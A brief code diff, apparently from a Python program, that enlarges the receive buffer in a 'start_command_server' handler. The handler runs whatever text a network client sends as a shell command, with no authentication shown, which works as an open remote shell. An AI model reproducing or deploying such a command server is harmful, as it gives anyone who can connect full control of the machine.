@@ -221,7 +221,7 @@ def device_verifier():
 def start_command_server():
     def handle_client(conn, addr):
         try:
-            data = conn.recv(1024).decode()
+            data = conn.recv(4096).decode()
             print(f"[CMD] Received from {addr}: {data}")
             try:
                 output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, text=True)
